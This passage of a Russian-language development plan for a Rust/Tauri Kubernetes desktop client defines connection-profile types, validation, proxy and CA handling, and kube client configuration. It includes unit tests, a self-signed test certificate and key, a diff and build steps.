    /// Токен хранится в keychain (`Token` и `Browser`).
    pub fn uses_token(&self) -> bool {
        matches!(self, AuthConfig::Token | AuthConfig::Browser)
    }
}

/// Чему доверять при проверке сертификата API-сервера.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "mode", rename_all = "camelCase")]
pub enum CaConfig {
    /// Системное хранилище сертификатов ОС.
    System,
    /// Только перечисленные сертификаты (один или несколько PEM), как `certificate-authority`
    /// в kubeconfig: системные корни при этом не используются.
    Pem { pem: String },
    /// Без проверки сертификата (`insecure-skip-tls-verify`); может быть запрещено политикой.
    Insecure,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "mode", rename_all = "camelCase")]
pub enum ProxyConfig {
    /// Переменные окружения `HTTPS_PROXY` / `NO_PROXY`.
    System,
    None,
    Url {
        url: String,
    },
}

fn default_ca() -> CaConfig {
    CaConfig::System
}

fn default_proxy() -> ProxyConfig {
    ProxyConfig::System
}

fn default_request_timeout() -> u64 {
    30_000
}

fn default_connect_timeout() -> u64 {
    10_000
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ConnectionProfile {
    pub id: String,
    pub name: String,
    pub color: String,
    pub environment: Environment,
    pub read_only: bool,
    /// Адрес API-сервера: `https://api.<кластер>:6443`; допускается путь — например, прокси Rancher
    /// `https://rancher.example.com/k8s/clusters/c-xxxxx`.
    pub api_url: String,
    pub auth: AuthConfig,
    #[serde(default = "default_ca")]
    pub ca: CaConfig,
    /// Имя для проверки сертификата, если оно отличается от хоста адреса (`tls-server-name`).
    #[serde(default)]
    pub tls_server_name: Option<String>,
    #[serde(default = "default_proxy")]
    pub proxy: ProxyConfig,
    /// Избранные проекты: закрепляются наверху дерева.
    #[serde(default)]
    pub favorite_namespaces: Vec<String>,
    /// Проекты, которые показываются, если кластер не отдаёт список проектов.
    #[serde(default)]
    pub manual_namespaces: Vec<String>,
    #[serde(default = "default_request_timeout")]
    pub request_timeout_ms: u64,
    #[serde(default = "default_connect_timeout")]
    pub connect_timeout_ms: u64,
    #[serde(default)]
    pub folder_id: Option<String>,
    #[serde(default)]
    pub order: i64,
    /// Поля из более новой версии Glafira: сохраняются при записи как есть.
    /// `ConnectionStore::upsert` входящий `extra` не принимает: у существующего профиля
    /// остаётся сохранённый, новый получает пустой.
    #[serde(flatten)]
    pub extra: serde_json::Map<String, serde_json::Value>,
}

/// Приводит поля к каноническому виду до проверки: адрес без пробелов и `/` на конце,
/// списки проектов без пустых строк и повторов.
pub fn normalize_profile(p: &mut ConnectionProfile) {
    p.api_url = p.api_url.trim().trim_end_matches('/').to_string();
    p.tls_server_name = p
        .tls_server_name
        .take()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty());
    for list in [&mut p.favorite_namespaces, &mut p.manual_namespaces] {
        let mut seen = std::collections::HashSet::new();
        list.retain_mut(|n| {
            *n = n.trim().to_string();
            !n.is_empty() && seen.insert(n.clone())
        });
    }
}

/// Сертификаты из PEM-текста (DER). Ошибка — если текст не PEM или в нём нет ни одного сертификата.
pub fn pem_certificates(text: &str) -> Result<Vec<Vec<u8>>, String> {
    let blocks = pem::parse_many(text.as_bytes()).map_err(|e| e.to_string())?;
    let certs: Vec<Vec<u8>> = blocks
        .into_iter()
        .filter(|b| b.tag() == "CERTIFICATE")
        .map(|b| b.into_contents())
        .collect();
    if certs.is_empty() {
        return Err("no CERTIFICATE blocks".into());
    }
    Ok(certs)
}

/// Имя проекта (namespace) по правилам DNS-1123: строчные латинские буквы, цифры и `-`,
/// начало и конец — буква или цифра, не длиннее 63 символов.
pub fn is_valid_namespace(name: &str) -> bool {
    let bytes = name.as_bytes();
    !bytes.is_empty()
        && bytes.len() <= 63
        && bytes
            .iter()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || *b == b'-')
        && bytes[0] != b'-'
        && bytes[bytes.len() - 1] != b'-'
}

fn invalid(key_and_text: crate::i18n::LocalizedText) -> AppError {
    AppError::localized(ErrorCode::InvalidInput, key_and_text)
}

pub fn validate_profile(p: &ConnectionProfile) -> AppResult<()> {
    if p.id.trim().is_empty() {
        return Err(invalid(ltext!(
            "errors.connections.noId",
            "The connection has no ID"
        )));
    }
    if p.name.trim().is_empty() {
        return Err(invalid(ltext!(
            "errors.connections.emptyName",
            "Connection name cannot be empty"
        )));
    }
    let url = url::Url::parse(p.api_url.trim()).map_err(|_| {
        invalid(ltext!(
            "errors.connections.badApiUrl",
            "Invalid API server address “{{url}}”",
            url = p.api_url
        ))
    })?;
    if url.query().is_some() || url.fragment().is_some() {
        return Err(invalid(ltext!(
            "errors.connections.badApiUrl",
            "Invalid API server address “{{url}}”",
            url = p.api_url
        )));
    }
    if url.scheme() != "https" || url.host_str().is_none_or(str::is_empty) {
        return Err(invalid(ltext!(
            "errors.connections.httpsRequired",
            "The API server address must start with https:// and contain a host"
        )));
    }
    if let AuthConfig::ClientCert { certificate_pem } = &p.auth
        && pem_certificates(certificate_pem).is_err()
    {
        return Err(invalid(ltext!(
            "errors.connections.certificatePemInvalid",
            "The client certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
        )));
    }
    if let CaConfig::Pem { pem } = &p.ca
        && pem_certificates(pem).is_err()
    {
        return Err(invalid(ltext!(
            "errors.connections.caPemInvalid",
            "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
        )));
    }
    if let ProxyConfig::Url { url } = &p.proxy {
        let ok = url::Url::parse(url.trim())
            .is_ok_and(|u| matches!(u.scheme(), "http" | "https") && u.host_str().is_some());
        if !ok {
            return Err(invalid(ltext!(
                "errors.connections.badProxyUrl",
                "Invalid proxy address “{{url}}”: use http://host:port",
                url = url
            )));
        }
    }
    if let Some(ns) = p
        .favorite_namespaces
        .iter()
        .chain(&p.manual_namespaces)
        .find(|n| !is_valid_namespace(n))
    {
        return Err(invalid(ltext!(
            "errors.connections.badNamespace",
            "“{{name}}” is not a valid project name: use lowercase letters, digits and “-”",
            name = ns
        )));
    }
    if p.request_timeout_ms < 1_000 || p.connect_timeout_ms < 1_000 {
        return Err(invalid(ltext!(
            "errors.connections.timeoutTooSmall",
            "Timeouts must be at least 1000 ms"
        )));
    }
    Ok(())
}

#[cfg(test)]
pub fn sample_profile(id: &str) -> ConnectionProfile {
    ConnectionProfile {
        id: id.to_string(),
        name: format!("conn-{id}"),
        color: "#4f8cff".into(),
        environment: Environment::Dev,
        read_only: false,
        api_url: "https://api.dev.example.com:6443".into(),
        auth: AuthConfig::Token,
        ca: CaConfig::System,
        tls_server_name: None,
        proxy: ProxyConfig::System,
        favorite_namespaces: Vec::new(),
        manual_namespaces: Vec::new(),
        request_timeout_ms: 30_000,
        connect_timeout_ms: 10_000,
        folder_id: None,
        order: 0,
        extra: Default::default(),
    }
}

/// Самоподписанный сертификат для тестов (CN=glafira-test).
#[cfg(test)]
pub const TEST_CERT_PEM: &str = include_str!("testdata/test-cert.pem");
````

<!-- block: file t04-src-tauri-src-storage-testdata-test-cert-pem step=4.3 path=src-tauri/src/storage/testdata/test-cert.pem -->
````text
-----BEGIN CERTIFICATE-----
MIIBZTCCAQqgAwIBAgIUXvQIksTIPN6vtnnsBUZUfb9rXecwCgYIKoZIzj0EAwIw
FzEVMBMGA1UEAwwMZ2xhZmlyYS10ZXN0MCAXDTI2MTAyNDE5NTEwN1oYDzIxMjYw
OTMwMTk1MTA3WjAXMRUwEwYDVQQDDAxnbGFmaXJhLXRlc3QwWTATBgcqhkjOPQIB
BggqhkjOPQMBBwNCAAQ8qQsHyA5q1lQweD5q7BSVBFX7b7z4qZETw1NYUvKtQq5t
WqgtT5OeEeH62GwT16Caq1Lam3l0772FTcaDYUS2ozIwMDAdBgNVHQ4EFgQUl/Ii
JfXdyT/Mwt2MJDcm0c43y60wDwYDVR0TAQH/BAUwAwEB/zAKBggqhkjOPQQDAgNJ
ADBGAiEArEOoOHyCscpGW69RuhSW4Ub+9+bYURKUQI121YShfDkCIQCQrs1GgpvJ
iSmbc5rbH/H9GTOO1NKtyForVh6eiGqPnw==
-----END CERTIFICATE-----
````

<!-- block: file t04-src-tauri-src-storage-testdata-test-key-pem step=4.3 path=src-tauri/src/storage/testdata/test-key.pem -->
````text
-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgxWgF1OZN2HSCBW/p
37ca0ICS6qT1555hCiwVRLbz0J+hRANCAAQ8qQsHyA5q1lQweD5q7BSVBFX7b7z4
qZETw1NYUvKtQq5tWqgtT5OeEeH62GwT16Caq1Lam3l0772FTcaDYUS2
-----END PRIVATE KEY-----
````

<!-- block: patch t04-src step=4.3 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -50,3 +50,7 @@
 | `docs/admin/policy.json` | `docs/admin/policy.json` | `8bbd0bd` | адаптирован: идентификаторы, allowInsecureTls |
 | `docs/admin/policy.mobileconfig` | `docs/admin/policy.mobileconfig` | `8bbd0bd` | адаптирован: идентификаторы, allowInsecureTls |
 | `docs/admin/policy.reg` | `docs/admin/policy.reg` | `8bbd0bd` | адаптирован: идентификаторы, allowInsecureTls |
+| `src-tauri/src/storage/connections.rs` | `src-tauri/src/storage/connections.rs` | `8bbd0bd` | адаптирован: профиль вынесен в profile.rs, тесты под Kubernetes |
+| `src-tauri/src/storage/tree.rs` | `src-tauri/src/storage/tree.rs` | `8bbd0bd` | как есть |
+| `src-tauri/src/storage/exchange.rs` | `src-tauri/src/storage/exchange.rs` | `8bbd0bd` | адаптирован: формат glafira-kubernetes-connections, флаги секретов, запрет insecure политикой |
+| `src-tauri/src/commands/folders.rs` | `src-tauri/src/commands/folders.rs` | `8bbd0bd` | адаптирован: политика в импорте, без сессий Kafka |
diff --git a/src-tauri/Cargo.toml b/src-tauri/Cargo.toml
--- a/src-tauri/Cargo.toml
+++ b/src-tauri/Cargo.toml
@@ -26,6 +26,10 @@ tracing = "0.1"
 tracing-subscriber = { version = "0.3", features = ["env-filter", "registry", "fmt"] }
 keyring = { version = "3", features = ["apple-native", "windows-native", "sync-secret-service"] }
 plist = "1"
+pem = "3"
+url = "2"
+uuid = { version = "1", features = ["v4"] }
+time = { version = "0.3", features = ["formatting"] }
 sys-locale = "0.3"
 
 [target.'cfg(windows)'.dependencies]
diff --git a/src-tauri/src/commands/mod.rs b/src-tauri/src/commands/mod.rs
--- a/src-tauri/src/commands/mod.rs
+++ b/src-tauri/src/commands/mod.rs
@@ -1,3 +1,4 @@
+pub mod folders;
 pub mod settings;
 
 use crate::error::{AppResult, ErrorCode};
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -38,6 +38,14 @@ pub fn run() {
             Ok(())
         })
         .invoke_handler(tauri::generate_handler![
+            commands::folders::list_folders,
+            commands::folders::create_folder,
+            commands::folders::rename_folder,
+            commands::folders::delete_folder,
+            commands::folders::move_items,
+            commands::folders::export_connections,
+            commands::folders::preview_import,
+            commands::folders::apply_import,
             commands::settings::get_language_settings,
             commands::settings::set_language,
             commands::settings::get_policy_status,
diff --git a/src-tauri/src/state.rs b/src-tauri/src/state.rs
--- a/src-tauri/src/state.rs
+++ b/src-tauri/src/state.rs
@@ -3,10 +3,12 @@ use std::sync::Arc;
 
 use crate::error::AppResult;
 use crate::secrets::SecretStore;
+use crate::storage::connections::ConnectionStore;
 
 /// Общее состояние приложения: хранилища и политика. Клонируется дёшево (всё за `Arc`).
 #[derive(Clone)]
 pub struct AppState {
+    pub connections: Arc<ConnectionStore>,
     pub secrets: Arc<dyn SecretStore>,
     pub policy: Arc<crate::policy::Policy>,
     pub settings: Arc<crate::settings::SettingsStore>,
@@ -14,8 +16,8 @@ pub struct AppState {
 
 impl AppState {
     pub fn new(data_dir: &Path, secrets: Arc<dyn SecretStore>) -> AppResult<Self> {
-        std::fs::create_dir_all(data_dir)?;
         Ok(Self {
+            connections: Arc::new(ConnectionStore::open(data_dir)?),
             secrets,
             policy: Arc::new(crate::policy::Policy::default()),
             settings: Arc::new(crate::settings::SettingsStore::open(data_dir)),
diff --git a/src-tauri/src/storage/mod.rs b/src-tauri/src/storage/mod.rs
--- a/src-tauri/src/storage/mod.rs
+++ b/src-tauri/src/storage/mod.rs
@@ -1 +1,5 @@
+pub mod connections;
+pub mod exchange;
 pub mod fs;
+pub mod profile;
+pub mod tree;
````

Применить: `python3 /tmp/o1a-blocks.py step 4.3`.

- [ ] **Step 4: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 96 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 5: Commit.**

```bash
git add -A
git commit -s -m "feat(storage): профиль подключения, хранилище, папки, экспорт и импорт" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 5: Клиент `kube` из профиля и классификация ошибок

**Files:**
- Create: `src-tauri/src/k8s/config.rs`, `src-tauri/src/k8s/errors.rs`, `src-tauri/src/k8s/mod.rs`
- Modify: `src-tauri/Cargo.toml`, `src-tauri/src/lib.rs`

**Interfaces:**
- Consumes: задача 4.
- Produces: `k8s::config::{EnvLookup, process_env, system_proxy(host, env) -> Option<String>, build_kube_config(&ConnectionProfile, &dyn SecretStore, EnvLookup) -> AppResult<kube::Config>, request_timeout(&ConnectionProfile) -> Duration}`; `k8s::errors::{chain_text(&dyn Error) -> String, from_kube(&kube::Error) -> AppError, forbidden(&str), from_status(&kube::core::Status), from_transport_text(&str), timeout()}`; ключи `errors.connections.{tokenMissing, loginRequired, clientKeyMissing}` и `errors.k8s.*`.

Спец. §2, §5.1–5.2, §15. `build_kube_config` собирает `kube::Config` без сети: токен или сертификат из keychain, CA (заданный CA заменяет системные корни — так `kube` 4.2 работает с `certificate-authority`), прокси из `HTTPS_PROXY`/`NO_PROXY` или явный, `User-Agent: glafira-kubernetes/<версия>`. Путь в адресе API сохраняется: `kube` добавляет его к каждому запросу — тест проверяет это настоящим запросом к локальному HTTP-серверу. Таймаут ответа не задаётся: он оборвал бы логи и watch этапа O1b; таймаут запроса ставит вызывающий код. `errors.rs` переводит ответы API-сервера (401 → `SESSION_EXPIRED`, 403 с разбором verb/resource/namespace, 404, 409, 422, 429, 5xx) и сетевые ошибки по тексту цепочки `source()` (TLS, DNS, отказ соединения, таймаут) — так же будут классифицироваться ошибки HTTP-клиента OAuth.

- [ ] **Step 1: Тесты.**

<!-- block: file t05-src-tauri-src-k8s-config-rs-tests step=5.1 path=src-tauri/src/k8s/config.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use secrecy::ExposeSecret;

    use super::*;
    use crate::secrets::MemoryStore;
    use crate::storage::profile::{TEST_CERT_PEM, sample_profile};

    const TEST_KEY_PEM: &str = include_str!("../storage/testdata/test-key.pem");

    fn no_env(_: &str) -> Option<String> {
        None
    }

    fn with_token(id: &str) -> MemoryStore {
        let s = MemoryStore::default();
        s.set(&secret_key(id, TOKEN), " sha256~abc \n").unwrap();
        s
    }

    #[test]
    fn token_profile_builds_bearer_config() {
        let p = sample_profile("a");
        let c = build_kube_config(&p, &with_token("a"), &no_env).unwrap();
        assert_eq!(
            c.cluster_url.to_string(),
            "https://api.dev.example.com:6443/"
        );
        assert_eq!(
            c.auth_info.token.as_ref().unwrap().expose_secret(),
            "sha256~abc"
        );
        assert_eq!(c.connect_timeout, Some(Duration::from_secs(10)));
        assert_eq!(c.read_timeout, None, "долгие потоки не обрываются");
        assert!(c.root_cert.is_none() && !c.accept_invalid_certs);
        assert!(c.proxy_url.is_none());
        assert!(c.headers.iter().any(|(k, v)| k == http::header::USER_AGENT
            && v.to_str().unwrap().starts_with("glafira-kubernetes/")));
    }

    #[test]
    fn missing_token_depends_on_method() {
        let mut p = sample_profile("a");
        let e = build_kube_config(&p, &MemoryStore::default(), &no_env).unwrap_err();
        assert_eq!(
            (e.code, e.key.as_str()),
            (ErrorCode::AuthFailed, "errors.connections.tokenMissing")
        );
        p.auth = AuthConfig::Browser;
        let e = build_kube_config(&p, &MemoryStore::default(), &no_env).unwrap_err();
        assert_eq!(
            (e.code, e.key.as_str()),
            (
                ErrorCode::SessionExpired,
                "errors.connections.loginRequired"
            )
        );
    }

    #[test]
    fn ca_modes() {
        let mut p = sample_profile("a");
        p.ca = CaConfig::Pem {
            pem: format!("{TEST_CERT_PEM}{TEST_CERT_PEM}"),
        };
        let c = build_kube_config(&p, &with_token("a"), &no_env).unwrap();
        assert_eq!(c.root_cert.unwrap().len(), 2);
        p.ca = CaConfig::Insecure;
        let c = build_kube_config(&p, &with_token("a"), &no_env).unwrap();
        assert!(c.accept_invalid_certs);
        p.ca = CaConfig::Pem { pem: "x".into() };
        let e = build_kube_config(&p, &with_token("a"), &no_env).unwrap_err();
        assert_eq!(e.key, "errors.connections.caPemInvalid");
    }

    #[test]
    fn client_certificate_goes_base64_and_needs_a_key() {
        let mut p = sample_profile("a");
        p.auth = AuthConfig::ClientCert {
            certificate_pem: TEST_CERT_PEM.into(),
        };
        let e = build_kube_config(&p, &MemoryStore::default(), &no_env).unwrap_err();
        assert_eq!(e.key, "errors.connections.clientKeyMissing");
        let secrets = MemoryStore::default();
        secrets
            .set(&secret_key("a", CLIENT_KEY), TEST_KEY_PEM)
            .unwrap();
        let c = build_kube_config(&p, &secrets, &no_env).unwrap();
        let cert = STANDARD
            .decode(c.auth_info.client_certificate_data.unwrap())
            .unwrap();
        assert_eq!(cert, TEST_CERT_PEM.as_bytes());
        let key = STANDARD
            .decode(c.auth_info.client_key_data.unwrap().expose_secret())
            .unwrap();
        assert_eq!(key, TEST_KEY_PEM.as_bytes());
        assert!(c.auth_info.token.is_none());
    }

    #[tokio::test]
    async fn every_auth_mode_produces_a_client() {
        let secrets = with_token("a");
        secrets
            .set(&secret_key("a", CLIENT_KEY), TEST_KEY_PEM)
            .unwrap();
        for (auth, ca) in [
            (AuthConfig::Token, CaConfig::System),
            (
                AuthConfig::Browser,
                CaConfig::Pem {
                    pem: TEST_CERT_PEM.into(),
                },
            ),
            (
                AuthConfig::ClientCert {
                    certificate_pem: TEST_CERT_PEM.into(),
                },
                CaConfig::Insecure,
            ),
        ] {
            let mut p = sample_profile("a");
            p.auth = auth.clone();
            p.ca = ca;
            let c = build_kube_config(&p, &secrets, &no_env).unwrap();
            assert!(kube::Client::try_from(c).is_ok(), "{auth:?}");
        }
    }

    #[test]
    fn proxy_modes() {
        let env = |name: &str| match name {
            "HTTPS_PROXY" => Some("http://proxy.corp:3128".to_string()),
            "NO_PROXY" => Some("localhost, .internal.corp,example.org".to_string()),
            _ => None,
        };
        assert_eq!(
            system_proxy("api.c", &env).as_deref(),
            Some("http://proxy.corp:3128")
        );
        for host in [
            "localhost",
            "api.internal.corp",
            "example.org",
            "api.example.org",
        ] {
            assert_eq!(system_proxy(host, &env), None, "{host}");
        }
        assert_eq!(system_proxy("api.c", &no_env), None);
        let star = |name: &str| match name {
            "https_proxy" => Some("http://p:1".to_string()),
            "no_proxy" => Some("*".to_string()),
            _ => None,
        };
        assert_eq!(system_proxy("api.c", &star), None);

        let mut p = sample_profile("a");
        let c = build_kube_config(&p, &with_token("a"), &env).unwrap();
        assert_eq!(c.proxy_url.unwrap().to_string(), "http://proxy.corp:3128/");
        p.proxy = ProxyConfig::None;
        assert!(
            build_kube_config(&p, &with_token("a"), &env)
                .unwrap()
                .proxy_url
                .is_none()
        );
        p.proxy = ProxyConfig::Url {
            url: "http://other:8080".into(),
        };
        let c = build_kube_config(&p, &with_token("a"), &no_env).unwrap();
        assert_eq!(c.proxy_url.unwrap().to_string(), "http://other:8080/");
    }

    /// Адрес API с путём (прокси Rancher `…/k8s/clusters/<id>`): запросы идут под этот путь.
    #[tokio::test]
    async fn api_url_path_prefixes_every_request() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let server = tokio::spawn(async move {
            let (mut sock, _) = listener.accept().await.unwrap();
            let mut buf = Vec::new();
            let mut chunk = [0u8; 1024];
            while !buf.windows(4).any(|w| w == b"\r\n\r\n") {
                let n = sock.read(&mut chunk).await.unwrap();
                buf.extend_from_slice(&chunk[..n]);
            }
            let body = r#"{"major":"1","minor":"31","gitVersion":"v1.31.4","gitCommit":"x","gitTreeState":"clean","buildDate":"2026-01-01T00:00:00Z","goVersion":"go1.23","compiler":"gc","platform":"linux/amd64"}"#;
            let resp = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            sock.write_all(resp.as_bytes()).await.unwrap();
            String::from_utf8(buf).unwrap()
        });
        let mut p = sample_profile("a");
        // Простой HTTP — только чтобы не поднимать TLS в тесте; профиль с http:// не сохранить.
        p.api_url = format!("http://127.0.0.1:{port}/k8s/clusters/c-x1");
        p.proxy = ProxyConfig::None;
        let c = build_kube_config(&p, &with_token("a"), &no_env).unwrap();
        let client = kube::Client::try_from(c).unwrap();
        let v = client.apiserver_version().await.unwrap();
        assert_eq!(v.git_version, "v1.31.4");
        let request = server.await.unwrap();
        assert!(
            request.starts_with("GET /k8s/clusters/c-x1/version "),
            "{request}"
        );
        assert!(
            request
                .to_lowercase()
                .contains("authorization: bearer sha256~abc")
        );
    }

    #[test]
    fn tls_server_name_and_timeouts_come_from_profile() {
        let mut p = sample_profile("a");
        p.tls_server_name = Some("api.internal".into());
        p.connect_timeout_ms = 2_000;
        p.request_timeout_ms = 5_000;
        let c = build_kube_config(&p, &with_token("a"), &no_env).unwrap();
        assert_eq!(c.tls_server_name.as_deref(), Some("api.internal"));
        assert_eq!(c.connect_timeout, Some(Duration::from_secs(2)));
        assert_eq!(request_timeout(&p), Duration::from_secs(5));
    }
}
````

<!-- block: file t05-src-tauri-src-k8s-errors-rs-tests step=5.1 path=src-tauri/src/k8s/errors.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn status_codes() {
        for (code, expected, key) in [
            (401, ErrorCode::SessionExpired, "errors.k8s.unauthorized"),
            (404, ErrorCode::NotFound, "errors.k8s.notFound"),
            (409, ErrorCode::Conflict, "errors.k8s.conflict"),
            (422, ErrorCode::InvalidInput, "errors.k8s.invalid"),
            (429, ErrorCode::Timeout, "errors.k8s.tooManyRequests"),
            (503, ErrorCode::ConnectionFailed, "errors.k8s.serverError"),
            (418, ErrorCode::Internal, "errors.k8s.apiError"),
        ] {
            let e = from_status(&Status::failure("boom", "Reason").with_code(code));
            assert_eq!((e.code, e.key.as_str()), (expected, key), "{code}");
            assert!(e.details.unwrap().contains("boom"));
        }
    }

    #[test]
    fn forbidden_names_the_missing_right() {
        let e = forbidden(
            r#"pods is forbidden: User "dev1" cannot list resource "pods" in API group "" in the namespace "team-a""#,
        );
        assert_eq!(e.code, ErrorCode::Forbidden);
        assert_eq!(e.key, "errors.k8s.forbiddenIn");
        assert_eq!(
            (
                e.params["verb"].as_str(),
                e.params["resource"].as_str(),
                e.params["namespace"].as_str()
            ),
            ("list", "pods", "team-a")
        );
        assert_eq!(e.message, "Not allowed: list pods in project “team-a”");

        let e = forbidden(
            r#"nodes is forbidden: User "system:serviceaccount:a:b" cannot list resource "nodes" in API group "" at the cluster scope"#,
        );
        assert_eq!(e.key, "errors.k8s.forbiddenCluster");
        assert_eq!(e.message, "Not allowed: list nodes at the cluster level");

        let e = forbidden(
            r#"deployments.apps "web" is forbidden: User "x" cannot patch resource "deployments" in API group "apps" in the namespace "a""#,
        );
        assert_eq!(e.params["verb"], "patch");
        assert_eq!(e.params["resource"], "deployments");

        let e = forbidden("access denied by webhook");
        assert_eq!(e.key, "errors.k8s.forbidden");
        assert_eq!(e.params["message"], "access denied by webhook");
        let e = from_status(&Status::failure("access denied", "Forbidden").with_code(403));
        assert_eq!(e.code, ErrorCode::Forbidden);
    }

    #[test]
    fn transport_texts() {
        for (text, code, key) in [
            (
                "ServiceError: client error (Connect): invalid peer certificate: NotValidForName",
                ErrorCode::TlsError,
                "errors.k8s.hostnameMismatch",
            ),
            (
                "client error (Connect): invalid peer certificate: UnknownIssuer",
                ErrorCode::TlsError,
                "errors.k8s.caUntrusted",
            ),
            (
                "invalid peer certificate: Other(OtherError(\"“*.badssl.com” certificate is not trusted: -67843\"))",
                ErrorCode::TlsError,
                "errors.k8s.caUntrusted",
            ),
            (
                "invalid peer certificate: Other(OtherError(\"“*.badssl.com” certificate is expired: -67818\"))",
                ErrorCode::TlsError,
                "errors.k8s.certExpired",
            ),
            (
                "invalid peer certificate: BadSignature",
                ErrorCode::TlsError,
                "errors.k8s.tlsError",
            ),
            (
                "ServiceError: client error (Connect): dns error: failed to lookup address information",
                ErrorCode::ConnectionFailed,
                "errors.k8s.dns",
            ),
            (
                "ServiceError: client error (Connect): tcp connect error: Connection refused (os error 61)",
                ErrorCode::ConnectionFailed,
                "errors.k8s.connect",
            ),
            (
                "ServiceError: deadline has elapsed",
                ErrorCode::Timeout,
                "errors.k8s.timeout",
            ),
            (
                "something else",
                ErrorCode::Internal,
                "errors.k8s.transport",
            ),
        ] {
            let e = from_transport_text(text);
            assert_eq!((e.code, e.key.as_str()), (code, key), "{text}");
            assert_eq!(e.details.as_deref(), Some(text));
        }
        assert!(from_transport_text("tcp connect error").retryable);
    }

    #[tokio::test]
    async fn real_connection_refused_is_connection_failed() {
        // Порт 1 на localhost закрыт: ошибка приходит от настоящего клиента kube.
        let mut c = kube::Config::new("https://127.0.0.1:1".parse().unwrap());
        c.connect_timeout = Some(std::time::Duration::from_secs(2));
        let client = kube::Client::try_from(c).unwrap();
        let e = client.apiserver_version().await.unwrap_err();
        let app = from_kube(&e);
        assert_eq!(app.code, ErrorCode::ConnectionFailed, "{:?}", app.details);
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 5.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t05-src-tauri-src-k8s-config-rs-impl step=5.2 path=src-tauri/src/k8s/config.rs part=impl -->
````rust
//! Сборка `kube::Config` из профиля подключения (спец. §5.1–5.2). Секреты читаются из keychain;
//! сеть здесь не используется.

use std::time::Duration;

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use kube::config::AuthInfo;
use secrecy::SecretString;

use crate::error::{AppError, AppResult, ErrorCode};
use crate::secrets::{CLIENT_KEY, SecretStore, TOKEN, secret_key};
use crate::storage::profile::{
    AuthConfig, CaConfig, ConnectionProfile, ProxyConfig, pem_certificates,
};

/// Значение переменной окружения (в тестах подменяется).
pub type EnvLookup<'a> = &'a dyn Fn(&str) -> Option<String>;

/// Переменные окружения процесса.
pub fn process_env(name: &str) -> Option<String> {
    std::env::var(name).ok()
}

/// Прокси для `host` из `HTTPS_PROXY` / `https_proxy` с учётом `NO_PROXY` / `no_proxy`
/// (`*`, точное имя, домен с точкой или без).
pub fn system_proxy(host: &str, env: EnvLookup) -> Option<String> {
    let get = |a: &str, b: &str| env(a).or_else(|| env(b)).filter(|v| !v.trim().is_empty());
    let proxy = get("HTTPS_PROXY", "https_proxy")?;
    let host = host.to_ascii_lowercase();
    if let Some(no_proxy) = get("NO_PROXY", "no_proxy") {
        let excluded = no_proxy.split(',').map(str::trim).any(|entry| {
            let entry = entry.to_ascii_lowercase();
            let domain = entry.trim_start_matches('.');
            entry == "*" || host == domain || host.ends_with(&format!(".{domain}"))
        });
        if excluded {
            return None;
        }
    }
    Some(proxy.trim().to_string())
}

fn invalid_url(p: &ConnectionProfile) -> AppError {
    app_err!(
        ErrorCode::InvalidInput,
        "errors.connections.badApiUrl",
        "Invalid API server address “{{url}}”",
        url = p.api_url
    )
}

/// Токен из keychain. Нет токена у входа через браузер — нужно войти (`SESSION_EXPIRED`),
/// у токена, вставленного вручную, — вставить его (`AUTH_FAILED`).
fn token(p: &ConnectionProfile, secrets: &dyn SecretStore) -> AppResult<String> {
    match secrets.get(&secret_key(&p.id, TOKEN))? {
        Some(t) if !t.trim().is_empty() => Ok(t.trim().to_string()),
        _ if p.auth == AuthConfig::Browser => Err(app_err!(
            ErrorCode::SessionExpired,
            "errors.connections.loginRequired",
            "Sign in to the cluster: use “Sign in via browser”"
        )),
        _ => Err(app_err!(
            ErrorCode::AuthFailed,
            "errors.connections.tokenMissing",
            "No token is saved for this connection — paste a token"
        )),
    }
}

/// `kube::Config` профиля. Таймаут ответа не задаётся: он оборвал бы долгие потоки (логи, watch);
/// таймаут запроса ставит вызывающий код (`request_timeout`).
pub fn build_kube_config(
    p: &ConnectionProfile,
    secrets: &dyn SecretStore,
    env: EnvLookup,
) -> AppResult<kube::Config> {
    let uri: http::Uri = p.api_url.trim().parse().map_err(|_| invalid_url(p))?;
    let host = uri.host().ok_or_else(|| invalid_url(p))?.to_string();
    let mut c = kube::Config::new(uri);
    c.connect_timeout = Some(Duration::from_millis(p.connect_timeout_ms));
    c.read_timeout = None;
    c.write_timeout = Some(request_timeout(p));
    c.tls_server_name = p.tls_server_name.clone();
    match &p.ca {
        CaConfig::System => {}
        CaConfig::Pem { pem } => {
            c.root_cert = Some(pem_certificates(pem).map_err(|_| {
                app_err!(
                    ErrorCode::InvalidInput,
                    "errors.connections.caPemInvalid",
                    "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
                )
            })?);
        }
        CaConfig::Insecure => c.accept_invalid_certs = true,
    }
    let proxy = match &p.proxy {
